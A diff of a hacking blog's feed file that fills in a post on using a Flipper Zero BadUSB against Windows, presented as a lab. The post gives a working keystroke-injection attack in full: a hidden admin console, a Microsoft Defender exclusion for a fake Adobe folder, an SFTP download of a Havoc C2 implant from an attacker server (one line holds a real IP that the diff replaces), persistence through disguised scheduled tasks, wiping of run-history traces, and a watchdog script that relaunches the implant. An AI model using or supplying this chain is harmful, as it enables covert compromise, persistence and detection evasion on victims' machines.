@@ -3,7 +3,7 @@
     <title>Cibersec and hacking blog</title>
     <link href="https://b4shnhawx.github.io/feed.xml" rel="self" />
     <link href="https://b4shnhawx.github.io" />
-    <updated>2025-01-07T17:58:30+01:00</updated>
+    <updated>2025-01-07T19:34:58+01:00</updated>
     <author>
         <name>b4shnhawx</name>
     </author>
@@ -16,6 +16,7 @@
         </author>
         <link href="https://b4shnhawx.github.io/flipper-zero-badusb.html"/>
         <id>https://b4shnhawx.github.io/flipper-zero-badusb.html</id>
+        <media:content url="https://b4shnhawx.github.io/media/posts/17/Screenshot-20250107-185918.png" medium="image" />
             <category term="windows"/>
             <category term="powershell"/>
             <category term="os"/>
@@ -26,11 +27,13 @@
         <updated>2024-12-31T20:07:42+01:00</updated>
             <summary>
                 <![CDATA[
+                        <img src="https://b4shnhawx.github.io/media/posts/17/Screenshot-20250107-185918.png" alt="BadUSB" />
                     Taking a step further from what we saw in the Havoc C2 post, let's take it a step further. Lets use the app BadUSB from Flipper Zero&hellip;
                 ]]>
             </summary>
         <content type="html">
             <![CDATA[
+                    <p><img src="https://b4shnhawx.github.io/media/posts/17/Screenshot-20250107-185918.png" class="type:primaryImage" alt="BadUSB" /></p>
                 <p>Taking a step further from what we saw in the <a href="https://b4shnhawx.github.io/creating-c2-with-havoc-in-kali-linux.html">Havoc C2 post</a>, let's take it a step further. </p>
 <p>Lets use the app BadUSB from Flipper Zero to inject malicious code in Windows 10/11 (also you can use Rubber Ducky). <br><br>In the lab we will:</p>
 <ul>
@@ -41,11 +44,11 @@
 </ul>
 <h3><strong>HOW IT WORKS?</strong></h3>
 <hr class="line">
-<p>Simply put, each device has a HID (Human Interface Device) that identifies which device it is. <br><br>Rubber Ducky (and Flipper Zero's BadUSB) shows the computer that its HID corresponds to a keyboard or mouse, allowing it to <em>"typing"</em> from a preloaded script.</p>
+<p>Simply put, each device has a HID (Human Interface Device) that identifies which device it is. <br><br>Rubber Ducky (and Flipper Zero's BadUSB) shows the computer that its HID corresponds to a keyboard or mouse, allowing it to <em>"typing"</em> from a preloaded script.<br><br></p>
 <h3>CREATION OF THE BADUSB / RUBBER DUCKY SCRIPT</h3>
 <hr class="line">
 <ol>
-<li>aaaaaa<br>
+<li>We prepare the terminal by opening as admin (CTRL + SHIFT + ENTER), and establish the color of the console white and the letters in white to reduce the visual impact. Also, reduce the size of the console at minimun.<br><br>
 <pre class="language-bash"><code>REM --&gt; Prepare terminal
 DELAY 1000
 REM --&gt; GUI d
@@ -69,7 +72,7 @@ STRING cd "$env:USERPROFILE\"
 ENTER
 DELAY 50</code></pre>
 </li>
-<li>aaaaaa<br>
+<li>Creates a new directory (example .adobe_reader) and then the exception for the Microsoft Defender. <br><br>
 <pre class="language-bash"><code>REM --&gt; Exception
 STRING New-Item -ItemType Directory -Path "$env:UserProfile\AppData\Local\.adobe_reader" -Force &gt; $null 2&gt;&amp;1
 ENTER
@@ -78,15 +81,15 @@ STRING Add-MpPreference -ExclusionPath "$env:UserProfile\AppData\Local\.adobe_re
 ENTER
 DELAY 50</code></pre>
 </li>
-<li>aaaaaa<br>
+<li>Connects the victim PC to the server following the next steps:<br><br>- Deletes in the known_hosts file the lines matching with the IP of the C2 server. This avoids any problem on the question "save SSH certificate for future connections?" in case we excecute the BadUSB before.<br>- Creates a backup of the file<br>- Connects to the server (user, IP and pass).<br>- Downloads the .exe and .ps1 into the exceptioned folder of the victim.<br>- Close the connection.<br><br>
 <pre class="language-bash"><code>REM --&gt; Transfer C2 exe SSH
-STRING (Get-Content ".\.ssh\known_hosts") | Where-Object { $_ -notmatch "172\.233\.32\.196" } | Set-Content ".\.ssh\known_hosts"
+STRING (Get-Content ".\.ssh\known_hosts") | Where-Object { $_ -notmatch "&lt;SFTP\.SERVER\.IP&gt;" } | Set-Content ".\.ssh\known_hosts"
 ENTER
 DELAY 100
 STRING copy .\.ssh\known_hosts .\.ssh\known_hosts_bckp
 ENTER
 DELAY 100
-STRING sftp &lt;SFTP USER&gt;@&lt;SFTP SERVER IP&gt;
+STRING sftp &lt;SFTP USER&gt;@&lt;SFTP.SERVER.IP&gt;
 ENTER
 DELAY 500
 STRING yes
@@ -111,7 +114,8 @@ STRING bye
 ENTER
 DELAY 100</code></pre>
 </li>
-<li>aaaaaa<br>
+<li>Set persistence by:<br>- Creates a new folder in the Microsoft folder of the scheduled tasks.<br>- Creates a new task executed always at boot. The command as its configured avoids that a powershell window opens at boot.<br>- Creates a new task executed always at login event. The command as its configured avoids that a powershell window opens at the login event.<br>- Finally, runs the task to launch the .ps1 / .exe<br><br>
+<blockquote>NOTE: In this example I'm using the .ps1 to launch the .exe. As we said, the powershell checks if there is other processes already connected to not duplicate processes and connections (and get more difficult to been detected by the user).</blockquote>
 <pre class="language-bash"><code>REM --&gt; Persistence
 STRING $scheduleObject = New-Object -ComObject schedule.service; $scheduleObject.connect(); $rootFolder = $scheduleObject.GetFolder("\Microsoft"); $rootFolder.CreateFolder("Adobe")
 ENTER
@@ -126,7 +130,7 @@ STRING schtasks /run /tn "Microsoft\Adobe\AdobeServiceLogon"
 ENTER
 DELAY 100</code></pre>
 </li>
-<li>aaaaaa<br>
+<li>Deletion of fingerprints.<br><br>
 <pre class="language-bash"><code>REM --&gt; Clean up
 STRING REG DELETE HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU /f
 ENTER
@@ -153,19 +157,19 @@ DELAY 10</code></pre>
 <hr class="line">
 <p>Simply put, each device</p>
 <ol>
-<li>aaaaaaaa<br>
+<li>Sets the variables names.<br><br>
 <pre class="language-bash"><code>$processName = "demon.x64.exe"
 $executablePath = "$env:USERPROFILE\AppData\Local\.adobe_reader\demon.x64.exe"
 $serverIP = "&lt;HAVOC SERVER IP&gt;"</code></pre>
 </li>
-<li>aaaaaaaa<br>
+<li>Gets the PIDs of the proccesses that has an active connection with the C2 server.<br><br>
 <pre class="language-bash"><code>$processesWithConnections = Get-NetTCPConnection |
     Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" -and $_.State -eq "Established" } |
     Select-Object -Property OwningProcess
 
 $connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningProcess }</code></pre>
 </li>
-<li>aaaaaaaa<br>
+<li>When we close the connection in Havoc, it only terminates the connection, but the process remains in the victim. With these lines, we achieve to kill the processes that no longer have a connection.<br><br>
 <pre class="language-bash"><code>Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue |
     Where-Object { $connectedProcessIds -notcontains $_.Id } |
     ForEach-Object {
@@ -173,10 +177,10 @@ $connectedProcessIds = $processesWithConnections | ForEach-Object { $_.OwningPro
         Stop-Process -Id $_.Id -Force
     }</code></pre>
 </li>
-<li>aaaaaaaa<br>
+<li>We get the proccesses with an active connection to the C2 server at port 443. <br><br>
 <pre class="language-bash"><code>Get-Process -Name ($processName -replace ".exe", "") -ErrorAction SilentlyContinue ; Get-NetTCPConnection | Select-Object -Property OwningProcess, LocalAddress, LocalPort, RemoteAddress, RemotePort, State | Sort-Object -Property OwningProcess | Where-Object { $_.RemoteAddress -eq $serverIP -and  $_.RemotePort -eq "443" }</code></pre>
 </li>
-<li>aaaaaaaa<br>
+<li>If already exists a proccess with an active connection, exits the script, but if there is no active connection against the C2 server, it executes the demon.exe.<br><br>
 <pre class="language-bash"><code>if (-not $connectedProcessIds) {
     Write-Output "There are no processes with active connection. Executing $executablePath..."
     Start-Process -FilePath $executablePath -NoNewWindow
